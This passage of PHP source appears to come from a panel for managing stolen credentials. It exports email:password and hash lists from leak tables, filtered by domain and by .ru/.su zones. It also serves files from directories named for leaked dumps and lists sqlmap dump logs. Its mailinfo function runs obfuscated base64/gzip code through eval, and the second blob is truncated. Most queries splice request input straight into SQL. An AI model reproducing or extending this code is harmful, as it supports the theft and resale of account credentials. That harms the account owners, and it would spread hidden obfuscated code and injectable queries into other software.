				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				
				
				$all = $type." s $sdate po $podate count: ".$count;
				$str = $z0;
				
				
			}
			

			if($corp_big =="big" AND $this->params['form']['down3'] !='')
			{
				
				//////// БЛОК с пассами без хешей///////////
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0' AND type='big'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0' AND type='big'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0' AND type='big'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0' AND type='big'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND type='big'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND type='big'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='big'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='big'");
					
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						
						$z0 .= "\r\n";

					}
					
					
					$data1 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='big'");
					
					$c1 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='big'");
					
					
					
					foreach($data1 as $d2)
					{
						$z0 .= $d2['mails']['email'];
						
						
						$z0 .= "\r\n";

					}
					
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $type." s $sdate po $podate count: ".$count;
				$str = $z0;
				
				

			}
			
			
			if($corp_big =="sred" AND $this->params['form']['down3'] !='')
			{
				
				//////// БЛОК с пассами без хешей///////////
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0' AND type='sred'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0' AND type='sred'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0' AND type='sred'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0' AND type='sred'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND type='sred'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND type='sred'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='sred'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='sred'");
					
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						
						$z0 .= "\r\n";

					}
					
					
					$data1 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='sred'");
					
					$c1 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='sred'");
					
					
					
					foreach($data1 as $d2)
					{
						$z0 .= $d2['mails']['email'];
						
						
						$z0 .= "\r\n";

					}
					
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $type." s $sdate po $podate count: ".$count;
				$str = $z0;
				

			}
			
			
			if($zona !='' AND $zona !='*' AND $this->params['form']['down2'] !='')
			{
				
				
				
				//////// БЛОК с пассами без хешей///////////
				
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0' AND hashtype ='0'");
					
					//$this->d("SELECT * FROM  `mails` WHERE meiler like '%$domen' AND pass !='0' AND hashtype ='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'  AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'  AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $zona.' count: '.$count;
				$str = $z0;
				

				
				
			}
			
			
			if($site !=''  AND $this->params['form']['onedomen'] !='')
			{
				
				
				
				//////// БЛОК с пассами без хешей///////////
				
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `domen` = '$site' AND pass !='0' AND hashtype ='0'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `domen` = '$site' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site''  AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site'  AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `domen` = '$site'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `domen` = '$site'");
					
					
					$data01 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE `date` >= '$sdate' AND `date` <= '$podate_one' AND `domen` = '$site'");
					
					$c01 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `date` >= '$sdate' AND `date` <= '$podate_one' AND `domen` = '$site'");
					
					//$this->d("SELECT count(*) FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `domen` = '$site'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
					
					foreach($data01 as $d11)
					{
						$z0 .= $d11['mails_one']['email'];
						
						if($d11['mails_one']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d11['mails_one']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
					$count = $c01[0][0]['count(*)'];
					
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $count+$c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $zona.' count: '.$count;
				$str = $z0;
				

				
				
			}
			
			
			if($site_one !=''  AND $this->params['form']['onedomen_one2'] !='')
			{
				
				//echo 123;
				//exit;
				
				
				
				
				
				
				$data01 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE `date` >= '$sdate_one' AND `date` <= '$podate_one' AND `domen` = '$site_one'");
				
				$c01 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `date` >= '$sdate_one' AND `date` <= '$podate_one' AND `domen` = '$site_one'");
				
				//$this->d("SELECT count(*) FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `domen` = '$site'");
				
				
				
				
				foreach($data01 as $d11)
				{
					$z0 .= $d11['mails_one']['email'];
					
					
					
					$z0 .= "\r\n";

				}
				
				$count = $c01[0][0]['count(*)'];
				
				
				
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $count+$c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $zona.' count: '.$count;
				$str = $z0;
				

				
				
			}
			
			
			
			if($ru_emails =="corp" AND $this->params['form']['down5'] !='')
			{
				//$this->d($sdate);
				//$this->d($podate);
				
				
				
				
				
				$data1 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='corp' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				$c1 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='corp' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				
				
				foreach($data1 as $d1)
				{
					
					$d1['mails']['email'] =strtolower($d1['mails']['email']);
					
					
					$z0 .= $d1['mails']['email'];
					$z0 .= "\r\n";
				}
				

				
				$count = $c1[0][0]['count(*)'];
				//$this->d($count);
				//exit;
				
				$all = "countMail corp ru mails s $sdate po $podate count: ".$count;
				$str = $z0;
				
				
			}
			
			if($ru_emails2 =="corp" AND $this->params['form']['down6'] !='')
			{
				
				
				$data0 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='corp' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				$c0 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='corp' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				
				
				
				
				
				foreach($data0 as $d)
				{
					
					$d['mails_one']['email'] =strtolower($d['mails_one']['email']);
					
					$z0 .= $d['mails_one']['email'];
					$z0 .= "\r\n";
				}
				
				
				

				
				$count = $c0[0][0]['count(*)'];
				//$this->d($count);
				//exit;
				
				$all = "countMail corp ru mails_one  s $sdate_one po $podate_one count: ".$count;
				$str = $z0;
				
				
			}
			
			if($ru_emails =="sred" AND $this->params['form']['down5'] !='')
			{
				//$this->d($sdate);
				//$this->d($podate);
				
				
				
				
				
				$data1 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='sred' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				$c1 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='sred' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				
				
				foreach($data1 as $d1)
				{
					
					$d1['mails']['email'] =strtolower($d1['mails']['email']);
					
					
					$z0 .= $d1['mails']['email'];
					$z0 .= "\r\n";
				}
				

				
				$count = $c1[0][0]['count(*)'];
				//$this->d($count);
				//exit;
				
				$all = "countMail sred ru mails s $sdate po $podate count: ".$count;
				$str = $z0;
				
				
			}
			
			if($ru_emails2 =="sred" AND $this->params['form']['down6'] !='')
			{
				
				
				$data0 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='sred' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				$c0 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='sred' AND (`zona`='ru' OR `zona`='su' OR `zona`='xn--p1ai')");
				
				
				
				
				
				
				foreach($data0 as $d)
				{
					
					$d['mails_one']['email'] =strtolower($d['mails_one']['email']);
					
					$z0 .= $d['mails_one']['email'];
					$z0 .= "\r\n";
				}
				
				
				

				
				$count = $c0[0][0]['count(*)'];
				//$this->d($count);
				//exit;
				
				$all = "countMail sred ru mails_one s $sdate_one po $podate_one count: ".$count;
				$str = $z0;
				
				
			}
			
			
			
			header('Content-type: application/txt');
			header("Content-Disposition: attachment; filename='{$all}.txt'");
			echo "$z0";
			die();
			

		}

		$p['sdate'] = $this->Post->query("SELECT date FROM  `mails` group by date ");
		$p['podate'] = $this->Post->query("SELECT date FROM  `mails` group by date DESC");
		
		$p['sdate_one'] = $this->Post->query("SELECT date FROM  `mails_one` group by date ");
		$p['podate_one'] = $this->Post->query("SELECT date FROM  `mails_one` group by date DESC");
		
		
		
		$p['domens'] = $this->Post->query("SELECT * FROM  `renders` order by countMail DESC");
		
		$p['domens_one'] = $this->Post->query("SELECT * FROM  `renders_one` order by countMail DESC");
		
		$this->set('data',$p);
	}
	
	function domens2(){ //функция перенесенная
		
		if(isset($_GET['z']))
		{
			$this->set('z', $_GET['z']);
		}
		
		if(!isset($_GET['z']))
		{
			$dd3 = new DATABASE_CONFIG;
			$dannie=$dd3->default;
			$ddb=mysql_connect($dannie['host'],$dannie['login'],$dannie['password']);
			mysql_select_db($dannie['database'],$ddb);
			$result = mysql_query("SELECT * FROM `domens2` ",$ddb);
			
			while ($row = mysql_fetch_array($result)) 
			{
				$dd=strtolower($row[0]);
				
				if(!isset($domen[$dd])){$domen[$dd]=0;$domen2[$dd]=0;$domen3[$dd]=0;}
				//preg_match("|^[a-z]{0,10}$|",$dd,$pp);
				//if($pp[0]==""){echo $dd;}
				if(preg_match("|^[a-z\.\-]{0,10}$|",$dd))
				{
					$domen[$dd]++;
				}
			}
			
			$this->set('domen', $domen);
		}
	}
	
	function domens3(){ //функция перенесенная
		
		//ini_set('memory_limit', '1000M');
		$dd3 = new DATABASE_CONFIG;
		$dannie=$dd3->default;
		if(isset($_GET['z']))
		{
			$this->set('z', $_GET['z']);
		}
		
		if(isset($_GET['t']))
		{
			$this->set('t', $_GET['t']);
		}
		
		//delaem raboty skripta
		if(!isset($_GET['z']) && !isset($_GET['t']))
		{
			$data = $this->Post->query("SELECT COUNT(*) FROM `domens` ");$this->set('shag3', $data);
			//print_r($data);
			$vol=$data[0][0]['COUNT(*)'];
			$kol=floor($vol/50000);
			$ost=$vol-(50000*$kol);
			//mysql_new
			$ddb=mysql_connect($dannie['host'],$dannie['login'],$dannie['password']);
			mysql_select_db($dannie['database'],$ddb);
			$result = mysql_query("SELECT * FROM `domens` ",$ddb);
			
			while ($row = mysql_fetch_array($result)) 
			{
				$dd=strtolower($row[1]);
				if(!isset($domen[$dd])){$domen[$dd]=0;$domen2[$dd]=0;$domen3[$dd]=0;}
				//preg_match("|^[a-z]{0,10}$|",$dd,$pp);
				//if($pp[0]==""){echo $dd;}
				if(preg_match("|^[a-z\.\-]{0,10}$|",$dd))
				{
					$domen[$dd]++;
					
					if(strlen($row[3])>=11)
					{
						$domen3[$dd]++;
					}
					else 
					{
						$domen2[$dd]++;
					}
				}
			}
			
			$this->set('domen', $domen);
			$this->set('domen2', $domen2);
			$this->set('domen3', $domen3);
		}	
	}
	
	function domens4(){ //функция перенесенная
		
		
		if(isset($_GET['z']))
		{
			$this->set('z', $_GET['z']);
		}
		if(!isset($_GET['z']))
		{
			$dd3 = new DATABASE_CONFIG;
			$dannie=$dd3->default;
			$ddb=mysql_connect($dannie['host'],$dannie['login'],$dannie['password']);
			mysql_select_db($dannie['database'],$ddb);
			$result = mysql_query("SELECT * FROM `domens2` ",$ddb);
			while ($row = mysql_fetch_array($result)) 
			{
				$dd=strtolower($row[1]);
				
				if(!isset($domen[$dd])){$domen[$dd]=0;$domen2[$dd]=0;$domen3[$dd]=0;}
				//preg_match("|^[a-z]{0,10}$|",$dd,$pp);
				//if($pp[0]==""){echo $dd;}
				if(preg_match("|^[a-z\.\-]{0,10}$|",$dd))
				{
					$domen[$dd]++;
				}
			}
			
			$this->set('domen', $domen);
		}
	}
	
	function download_domens(){
		
		//$this->set('domen', $domen);
		
		$dir = "./slivpass_save";   //задаём имя директории
		if(is_dir($dir)) {   //проверяем наличие директории
			$files = scandir($dir);    //сканируем (получаем массив файлов)
			array_shift($files); // удаляем из массива '.'
			array_shift($files); // удаляем из массива '..'
			$domain_name = ""; // Для сохранения доменного имени
			
			if(isset($_GET['name']))
			{

				// Имя домена, файлы которого нужно паковать
				$domain_name = $_GET['name'];
				//Хранит имя и путь создаваемого архива
				//$zip_file = "{$domain_name}.zip";
				
				// Создаем архив
				//$zip = new ZipArchive();
				//if ($zip->open($zip_file, ZIPARCHIVE::CREATE)!==TRUE)
				//exit("Невозможно открыть <$filename>\n");

				// Поиск и добавление файлов для запаковки
				for($i=0; $i < sizeof($files); $i++)
				{ 
					if(preg_match("/{$domain_name}/", $files[$i]))
					{
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
						$p = $dir.'/'.$files[$i];
						$p2 = $files[$i];
						
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
					}
				}

				//print_r(file_get_contents($p));
				
				// Закрываем архив
				//$zip->close();

				//$file = ("{$domain_name}.zip");
				$file = $domain_name;
				header ("Content-Type: application/octet-stream");
				//header ("Accept-Ranges: bytes");
				//header ("Content-Length: ".filesize($file));
				//header ("Content-Disposition: attachment; filename=".$file);  
				//readfile($file);
				//unlink($file);
				//header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='.{$p2}'");
				//echo file_get_contents($p);
				readfile($p);
				exit;
			}
		}	
		
	}
	
	function download_domens2(){
		
		//$this->set('domen', $domen);
		
		$dir = "./sliv_save";   //задаём имя директории
		if(is_dir($dir)) {   //проверяем наличие директории
			$files = scandir($dir);    //сканируем (получаем массив файлов)
			array_shift($files); // удаляем из массива '.'
			array_shift($files); // удаляем из массива '..'
			$domain_name = ""; // Для сохранения доменного имени
			
			if(isset($_GET['name']))
			{

				// Имя домена, файлы которого нужно паковать
				$domain_name = $_GET['name'];
				//Хранит имя и путь создаваемого архива
				//$zip_file = "{$domain_name}.zip";
				
				// Создаем архив
				//$zip = new ZipArchive();
				//if ($zip->open($zip_file, ZIPARCHIVE::CREATE)!==TRUE)
				//exit("Невозможно открыть <$filename>\n");

				// Поиск и добавление файлов для запаковки
				for($i=0; $i < sizeof($files); $i++)
				{ 
					if(preg_match("/{$domain_name}/", $files[$i]))
					{
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
						$p = $dir.'/'.$files[$i];
						$p2 = $files[$i];
						
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
					}
				}

				//print_r(file_get_contents($p));
				
				// Закрываем архив
				//$zip->close();

				//$file = ("{$domain_name}.zip");
				$file = $domain_name;
				header ("Content-Type: application/octet-stream");
				//header ("Accept-Ranges: bytes");
				//header ("Content-Length: ".filesize($file));
				//header ("Content-Disposition: attachment; filename=".$file);  
				//readfile($file);
				//unlink($file);
				//header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='.{$p2}'");
				//echo file_get_contents($p);
				readfile($p);
				exit;
			}
		}	
		
	}
	
	function download_domens3(){
		
		//$this->set('domen', $domen);
		
		$dir = "./slivdump_one";   //задаём имя директории
		if(is_dir($dir)) {   //проверяем наличие директории
			$files = scandir($dir);    //сканируем (получаем массив файлов)
			array_shift($files); // удаляем из массива '.'
			array_shift($files); // удаляем из массива '..'
			$domain_name = ""; // Для сохранения доменного имени
			
			if(isset($_GET['name']))
			{

				// Имя домена, файлы которого нужно паковать
				$domain_name = $_GET['name'];
				//Хранит имя и путь создаваемого архива
				//$zip_file = "{$domain_name}.zip";
				
				// Создаем архив
				//$zip = new ZipArchive();
				//if ($zip->open($zip_file, ZIPARCHIVE::CREATE)!==TRUE)
				//exit("Невозможно открыть <$filename>\n");

				// Поиск и добавление файлов для запаковки
				for($i=0; $i < sizeof($files); $i++)
				{ 
					if(preg_match("/{$domain_name}/", $files[$i]))
					{
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
						$p = $dir.'/'.$files[$i];
						$p2 = $files[$i];
						
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
					}
				}

				//print_r(file_get_contents($p));
				
				// Закрываем архив
				//$zip->close();

				
				//$this->d($p,'$p');
				//exit;
				
				//$file = ("{$domain_name}.zip");
				$file = $domain_name;
				header ("Content-Type: application/octet-stream");
				//header ("Accept-Ranges: bytes");
				//header ("Content-Length: ".filesize($file));
				//header ("Content-Disposition: attachment; filename=".$file);  
				//readfile($file);
				//unlink($file);
				//header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='.{$p2}'");
				//echo file_get_contents($p);
				readfile($p);
				exit;
			}
		}	
		
	}
	
	function download_sqlmap(){
		
		//$this->set('domen', $domen);
		
		$dir = "./mod_sqlmap/log";   //задаём имя директории
		if(is_dir($dir)) {   //проверяем наличие директории
			$files = scandir($dir);    //сканируем (получаем массив файлов)
			array_shift($files); // удаляем из массива '.'
			array_shift($files); // удаляем из массива '..'
			$domain_name = ""; // Для сохранения доменного имени
			
			//$this->d($files,'ff');
			//exit;
			$i = 0 ;
			foreach($files  as $dir_one)
			{
				$site_dir = scandir($dir.'/'.$dir_one);	
				
				//$this->d($site_dir,"$dir_one".'- $site_dir');
				
				
				if(filesize($dir.'/'.$dir_one.'/log')==0){
					//$this->d('null');
					
				}else{
					echo $dir.'/'.$dir_one.'/';
					echo '<br>';
					
					$site_dir_dump = scandir($dir.'/'.$dir_one.'/dump');	
					
					foreach($site_dir_dump as $site_dir_dump_good){
						
						echo $site_dir_dump_good.'<br>';
					}
					
					
				}
				
				
				$i++;
				
				//if($i ==500)break;
				
			}
			
			
			
			
			if(isset($_GET['name']))
			{

				// Имя домена, файлы которого нужно паковать
				$domain_name = $_GET['name'];
				//Хранит имя и путь создаваемого архива
				//$zip_file = "{$domain_name}.zip";
				
				// Создаем архив
				//$zip = new ZipArchive();
				//if ($zip->open($zip_file, ZIPARCHIVE::CREATE)!==TRUE)
				//exit("Невозможно открыть <$filename>\n");

				// Поиск и добавление файлов для запаковки
				for($i=0; $i < sizeof($files); $i++)
				{ 
					if(preg_match("/{$domain_name}/", $files[$i]))
					{
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
						$p = $dir.'/'.$files[$i];
						$p2 = $files[$i];
						
						//$zip->addFile("{$dir}/{$files[$i]}",$files[$i]);
					}
				}

				//print_r(file_get_contents($p));
				
				// Закрываем архив
				//$zip->close();

				//$file = ("{$domain_name}.zip");
				$file = $domain_name;
				header ("Content-Type: application/octet-stream");
				//header ("Accept-Ranges: bytes");
				//header ("Content-Length: ".filesize($file));
				//header ("Content-Disposition: attachment; filename=".$file);  
				//readfile($file);
				//unlink($file);
				//header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='.{$p2}'");
				//echo file_get_contents($p);
				readfile($p);
				exit;
			}
		}	
		
	}
	
	function down_all(){
		
			
					$data0 = $this->Filed->query("SELECT url FROM `posts`");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM `posts`");
					
					foreach($data0 as $d)
					{
						
						
						
						$z0 .= $d['posts']['url'];
						$z0 .= "\r\n";
					}
					
					
					

					
					$count = $c0[0][0]['count(*)'];
					//$this->d($count);
					//exit;
					
					
					$str = $z0;
					
					$all = 'VSE';
				
				
				
				
				header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='{$all}.txt'");
				echo "$z0";
				die();
		
		
	}	
	
	
	function mailinfo(){ // суммарная информация обо всем
		eval(gzuncompress(base64_decode('eF5TSUlJsVWJD3YNCnMNilZ38XcO9XX1C4kP8vcPUY9V0FPXT07MTtXPyUwq1k/Ozyspys/JSS3Sz8zLSk0u0SvIKFC3VsnILy6Jz0stty0pyszVSMvMSY1PTy2JBylPzSsp1lAB2qGpaQ0AbJ4ktQ==')));

        
        
       eval(gzuncompress(base64_decode('eNqdfPlvE+e6/7/iRr33EJqGWTwzcVFuFQpNoSyl0IU2fKOxPU7cOHaOF2L36EiAWEILqdhB/AKiDWWHSAQhhAQBSknYStnXf+X7fJ7nnfHYscO5l9aJY8+8y7N+nuWdRMYtFCK92048PH/ir8npa/v+NZRPr3OLXqRQdIvpxPu9o8fGnv12cv/8oVI8k06ojyOpUjZRTOeykd6Dx08/3X5ses77veefTZ3bum3vlj9b/5VOzXmv4GVSH30UDND6kXzQu+nq8be3Hpyf0zrfyybTqfl5r1jKZyN1l38fGm/t/H/Pm7sgk8sls+nsD+5HkcURWspApJIr5SOem8/k4l5bxM0mI6VsMicfD7vFRH/73Hm12wmtO1jGv+pm7nTzebcyR9M1ow0/5s1d5ebdfj2WStDUg/SvLZIbcCs0eFtwkfzoMNvt+pUW3QGPlhQZcrPFQiSXSrVF+vKlbDGd7aNd0HdupJjPZTIYDvfX/aidfY3n9vPu6b50MZLPlfr6eR1a/bSFQVcoFCn2g1bxXK4oS9b46vCoK/ojFRq4jS51i5GU52UKkT4aLLicdof/9XardppVmKTN/1XxPM91+/t5RXQtvczwv/olDoIyhdygFynm3EKRGejRAmhjRCZhI0lne2QpvlnxD/o94BUi8VKx6NE3mUwknZWrEnlaQHtkGfFG5q6bN7xZkITph81+PPNq+tuw6pc6RDSRpcbdLP1XkGkMS11dS822yDAI6eY9nq0vl826ERLM4XSxn6bNFbyP1e2t82tn6vOKEZpkyHOzpSLt/At5E0nlc4N0J6bPZIbc/ADN/+/aadWlNPK/3+9eumJB19JV37f0lK1UMt6jOXrK6imbNr06ejTb1OmH3aNHLfrtaJZJn+upRNyK0RvHTER7yjZelpZ0XfrIbFnra4Xt1En451420p1Pp1JeJbIk3w4RxT8lBh+SXugOCY+jW22aYdgsTbZDH1l2HWe+CROt6GYGoCJuPFdiNmmWAzm07SjdT4SnkS29jk//GIwUhrxssY1Y9kNpcIiIPpwlKSnmmHhEO1okhKkwmGPNS7lF0gpoaX8+N0z6lBgoRGgVuDrhFgui445Bc5pRk5TAtPW6Va/uTxci9H+hWBpKJ2XPZr2eFHNZL/JJLpOkt946L9JVKpABiPSl15FADyotiHteXia0HRrEmCke37iQpG/yXqGY8UKjEn2qPO/tMU3rZE85Efvr8O4eI6oT8+JuwbOjvUnvkxVJb04Lcd6EGPTohlG